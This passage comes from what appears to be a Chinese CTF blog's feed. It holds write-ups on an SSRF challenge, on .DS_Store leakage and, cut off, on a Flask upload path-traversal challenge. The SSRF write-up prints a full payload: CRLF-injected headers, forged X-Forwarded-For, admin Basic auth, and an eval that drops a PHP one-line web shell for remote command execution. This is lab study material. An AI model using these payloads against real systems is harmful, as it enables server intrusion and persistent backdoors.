&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果不存在认证信息，输出 &quot;Hacker&quot; 并终止脚本执行</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码（略……在上面源码里注释了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 检查是否通过 GET 方法提交了 &#x27;location&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果提交了，将提交的服务地址赋值给 $location 变量</span><br>    <span class="hljs-variable">$location</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>];<br>    <span class="hljs-comment">// 创建一个新的 SOAP 客户端实例</span><br>    <span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>        <span class="hljs-comment">// 设置 SOAP 服务的地址</span><br>        <span class="hljs-string">&quot;location&quot;</span>=&gt;<span class="hljs-variable">$location</span>,<br>        <span class="hljs-comment">// 设置 SOAP 服务的命名空间，这里为 &#x27;hahaha&#x27;</span><br>        <span class="hljs-string">&quot;uri&quot;</span>=&gt;<span class="hljs-string">&quot;hahaha&quot;</span>,<br>        <span class="hljs-comment">// 设置连接 SOAP 服务的用户名</span><br>        <span class="hljs-string">&quot;login&quot;</span>=&gt;<span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-comment">// 设置连接 SOAP 服务的密码</span><br>        <span class="hljs-string">&quot;password&quot;</span>=&gt;<span class="hljs-string">&quot;gueeeeest!!!!&quot;</span>,<br>        <span class="hljs-comment">// 设置 HTTP 请求头中的 User-Agent，包含用户名</span><br>        <span class="hljs-string">&quot;user_agent&quot;</span>=&gt;<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;s Chrome&quot;</span><br>    ));<br></code></pre></td></tr></table></figure><p>在<code>h4d333333.php</code>中的这部分设置了一系列东西，其中有设置 SOAP 服务的地址<code>location</code>，然后我们在<code>calculator.php</code>的源码中可以看到有检查请求客户端的IP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 检查请求的客户端 IP 地址是否为本地地址 127.0.0.1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-comment">// 如果不是本地地址，输出 &quot;Hacker&quot; 并终止脚本执行</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以就可以想到SSRF，我们可以在<code>h4d333333.php</code>创建的实例 SOAP 打SSRF去访问<code>calculator.php</code>，把<code>location</code>的值设置为<code>127.0.0.1</code>就可以绕过客户端 IP 的检测去访问<code>calculator.php</code>，所以就可以先构造出以下<code>payload</code>，这里要用 GET 请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">/h4d333333.php?location=http://127.0.0.1/calculator.php<br></code></pre></td></tr></table></figure><p>在<code>h4d333333.php</code>中还有一个POST请求的参数user，可以利用SSRF写shell，要POST打SSRF的话，接下来就是找需要提交哪些请求头和值，要注意每个请求头之间要用<code>%0d%0a</code>进行分隔开来，这个是回车符（<code>\r</code>）和换行符（<code>\n</code>）的URL编码形式</p><p>首先是要POST传参<code>user</code>的，值的话随便填写，不是什么奇奇怪怪的就行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">user=abc<br></code></pre></td></tr></table></figure><p>然后是正常POST打SSRF需要的请求头<code>Content-Type</code>，之间用bp抓包后复制粘贴过来</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p>因为上面要检查客户端的请求 IP ，所以这里可以加上<code>X - Forwarded - For: 127.0.0.1</code>来伪造IP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>然后去看<code>calculator.php</code>的源码，有一个<code>check</code>函数检查 HTTP 认证信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 定义一个用于检查 HTTP 认证信息的函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$auth</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 声明使用全局变量 $admin 和 $adminpass</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$admin</span>,<span class="hljs-variable">$adminpass</span>;<br>    <span class="hljs-comment">// 去除认证信息中的 &quot;Basic &quot; 前缀</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;Basic &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 对去除前缀后的认证信息进行 Base64 解码</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 使用冒号分割解码后的认证信息，得到用户名和密码</span><br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-variable">$auth</span>);<br>    <span class="hljs-comment">// 输出用户名和密码，方便调试</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$password</span>;<br>    <span class="hljs-comment">// 检查用户名和密码是否与管理员的用户名和密码匹配</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-variable">$admin</span> &amp;&amp; <span class="hljs-variable">$password</span>===<span class="hljs-variable">$adminpass</span>) &#123;<br>        <span class="hljs-comment">// 如果匹配，返回 1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果不匹配，返回 2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 获取 POST 请求中名为 &quot;expression&quot; 的参数值，即要计算的数学表达式</span><br><span class="hljs-variable">$expression</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;expression&#x27;</span>];<br><span class="hljs-comment">// 获取 HTTP 请求头中的 &quot;Authorization&quot; 字段的值，即认证信息</span><br><span class="hljs-variable">$auth</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];<br></code></pre></td></tr></table></figure><p>这里要验证登录的用户和密码，给的请求头是<code>Authorization</code>，在<code>check</code>函数中会去除</p><p><code>Basic </code>前缀，还会对其进行 base64 解码，并且使用冒号<code>:</code>来分隔开用户名和密码，对于admin的用户名和密码早在开头就已经定义好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 定义管理员用户名</span><br><span class="hljs-variable">$admin</span>=<span class="hljs-string">&quot;aaaaaaaaaaaadmin&quot;</span>;<br><span class="hljs-comment">// 定义管理员密码</span><br><span class="hljs-variable">$adminpass</span>=<span class="hljs-string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;<br></code></pre></td></tr></table></figure><p>所以经过分析后我们就可以开始构造<code>Authorization</code>这个请求头了，首先是正常的使用admin的用户名和密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 检查是否存在认证信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$auth</span>))&#123;<br>    <span class="hljs-comment">// 调用 check 函数检查认证信息</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$auth</span>)===<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-comment">// 如果认证失败（返回值为 2）</span><br>        <span class="hljs-comment">// 检查表达式是否只包含数字和四则运算符</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="hljs-variable">$expression</span>)) &#123;<br>            <span class="hljs-comment">// 如果表达式不符合要求，输出 &quot;Invalid expression&quot; 并终止脚本执行</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid expression&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// 如果表达式符合要求，使用 eval 函数计算表达式的值</span><br>            <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>            <span class="hljs-comment">// 将计算结果写入 &quot;result&quot; 文件</span><br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果认证成功（返回值不为 2）</span><br>        <span class="hljs-comment">// 直接使用 eval 函数计算表达式的值</span><br>        <span class="hljs-variable">$result</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$expression</span>;&quot;</span>);<br>        <span class="hljs-comment">// 将计算结果写入 &quot;result&quot; 文件</span><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result&quot;</span>,<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果不存在认证信息，输出 &quot;Hacker&quot; 并终止脚本执行</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里一定要用admin的用户名和密码，因为在后面的检查认证信息中是会检查<code>check($auth)</code>的返回值的，不是admin的会返回2，最终会有检查构造的<code>expression</code>表达式的，只有符合要求才能被<code>eval</code>执行，而如果是admin的会返回1，最终是直接执行构造的<code>expression</code>表达式的，这样我们就可以对这个表达式进行构造恶意的代码从而进行RCE或传shell了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st<br></code></pre></td></tr></table></figure><p>然后是要进行 base64 编码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0<br></code></pre></td></tr></table></figure><p>最后是要加上<code>Basic </code>前缀，这里要注意在<code>Basic</code>后面跟还有一个空格别忘了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0<br></code></pre></td></tr></table></figure><p>这个就是最终要构造的<code>Authorization</code>这个请求头了</p><p>然后是要POST传参的<code>expression</code>，这个是要在后面中的被<code>eval</code>执行的，可以构造一个恶意代码进行传shell，这个恶意代码可以被执行的前提是满足前面的身份认证，这里使用<code>file_put_contents</code>函数，写一个后门文件进去，最好加上base64编码可以绕过些限制，这里就是将一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>写入<code>shell3.php</code>文件中</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">expression=file_put_contents(&#x27;shell3.php&#x27;, base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;))<br></code></pre></td></tr></table></figure><p>最后就是正常的POST请求打SSRF需要的请求头<code>Content-Length</code>，即请求的内容长度，是根据上面构造的<code>expression</code>来进行构造的</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>101<br></code></pre></td></tr></table></figure><p>这里有个地方，你会不会疑问为什么这个的长度不包含<code>user</code>呢，它也是POST传参的呀，为什么不加上它的长度</p><p>原因就是这里的<code>Content-Length</code>记录的是请求网址的POST要传的参，即<code>calculator.php</code>对要传的参，而<code>user</code>是<code>h4d333333.php</code>中的参数，所以不要包含<code>user</code>的内容长度</p><p>至此，综合以上构造的所有的POST打SSRF的内容的<code>payload</code>如下，要用<code>%0d%0a</code>分隔开各个请求头</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">user=abc%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aAuthorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: 101%0d%0a%0d%0aexpression=file_put_contents(&#x27;shell3.php&#x27;, base64_decode(&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;))<br></code></pre></td></tr></table></figure><p>然后在<code>h4d333333.php</code>中发送构造的GET和POST请求，打SSRF</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000442974.png" alt="image-20250331000442974"></p><p>然后访问<code>shell3.php</code>文件，利用POST参数<code>cmd</code>进行RCE</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000544062.png" alt="image-20250331000544062"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Web-ez-SSRF/image-20250331000601611.png" alt="image-20250331000601611"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SYC</span>&#123;<span class="hljs-number">76284</span>c66-<span class="hljs-number">4103</span>-<span class="hljs-number">4</span>e62-a095-<span class="hljs-number">461431</span>bdb852&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DS_Store泄露</title>
    <link href="/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/29/DS-Store%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是-DS-Store"><a href="#什么是-DS-Store" class="headerlink" title="什么是.DS_Store"></a>什么是.DS_Store</h1><p>.DS_Store 是 “Desktop Services Store” 的缩写，是 Mac OS 系统自动为每个文件夹创建的隐藏文件2。它主要用于存储文件夹的显示属性，如文件图标的摆放位置、视图设置、背景颜色等，以便让用户在下次打开文件夹时能保持之前的个性化设置</p><h1 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h1><p>由于开发&#x2F;设计人员在发布代码时未删除文件夹中隐藏的.DS_store，.DS_Store 文件包含了文件夹中的文件和子目录的列表信息，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露</p><h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>工具网址：<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python main.py .DS_Store<br></code></pre></td></tr></table></figure><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>题目来源：NSSCTF—.DS_Store泄露</p><p>用dirsearch扫出有<code>.DS_Store</code>文件<img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/re%E6%B3%84%E9%9C%B2/image-20250429192558291.png" alt="image-20250429192558291"></p><p>访问文件可以下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node5.anna.nssctf.cn:20640/.DS_store<br></code></pre></td></tr></table></figure><p>然后把下载的文件复制到脚本的目录下</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/re%E6%B3%84%E9%9C%B2/image-20250429192759151.png" alt="image-20250429192759151"></p><p>利用工具获取网站的文件目录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> .DS_Store<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/re%E6%B3%84%E9%9C%B2/image-20250429192939298.png" alt="image-20250429192939298"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/re%E6%B3%84%E9%9C%B2/image-20250429192958196.png" alt="image-20250429192958196"></p>]]></content>
    
    
    <categories>
      
      <category>信息搜集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集 DS_Store泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewYear CTF 2025--Web-🐍年大吉</title>
    <link href="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/"/>
    <url>/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/</url>
    
    <content type="html"><![CDATA[<p>题目网址：<a href="https://ctf.xidian.edu.cn/training/16?challenge=704">https://ctf.xidian.edu.cn/training/16?challenge=704</a></p><p>给了题目附件</p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429201406803.png" alt="image-20250429201406803"></p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429201412575.png" alt="image-20250429201412575"></p><p>app.py源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, jsonify, send_from_directory<br><br>app = Flask(__name__)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><span class="hljs-meta">@app.before_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">before_request</span>():<br>    <span class="hljs-keyword">try</span>:<br>        os.remove(<span class="hljs-string">&#x27;archive.tar&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred while removing tar file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file part&#x27;</span><br><br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br><br>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;File <span class="hljs-subst">&#123;file.filename&#125;</span> uploaded successfully!&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/list&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_files</span>():<br>    <span class="hljs-keyword">try</span>:<br>        result = subprocess.run(<br>            [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; find *&#x27;</span>],<br>            stdout = subprocess.PIPE,<br>            text = <span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;files&#x27;</span>: result.stdout.splitlines()&#125;)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error occurred while listing files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_files</span>():<br>    <span class="hljs-keyword">try</span>:<br>        subprocess.run(<br>            [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; rm ./*&#x27;</span>]<br>        )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;All files deleted successfully!&#x27;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error occurred while deleting files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_files</span>():<br>    subprocess.run(<br>        [<span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">f&#x27;cd <span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span> &amp;&amp; tar -cvf ../archive.tar *&#x27;</span>]<br>    )<br><br>    <span class="hljs-keyword">return</span> send_from_directory(<br>        directory=<span class="hljs-string">&#x27;.&#x27;</span>,<br>        path=<span class="hljs-string">&#x27;archive.tar&#x27;</span>,<br>        as_attachment=<span class="hljs-literal">True</span><br>    )<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>一共有四个路由</p><ul><li><code>/upload</code>可以上传文件</li><li><code>/list</code>可以查看上传在<code>/uploads</code>目录下的文件</li><li><code>/delete</code>可以删除所有在<code>/uploads</code>目录下的文件</li><li><code>/download</code>可以将所有在<code>/uploads</code>目录下的文件打包成<code>archive.tar</code>下载下来</li></ul><p>根据给的题目附件的文件目录分布可知，<code>app.py</code>文件是在<code>uploads</code>目录的上一级，如果没有对文件名字进行过滤，就可以尝试构造出<code>../app.py</code>的文件名，利用<code>upload</code>路由上传文件并且覆盖掉源文件<code>app.py</code>，可以在上传的文件中添加一个可以RCE的路由，进而在覆盖掉源文件后可以进行RCE</p><p>直接在题目附件所给的<code>app.py</code>中添加可以RCE的路由</p><figure class="highlight python"><table><tr><td 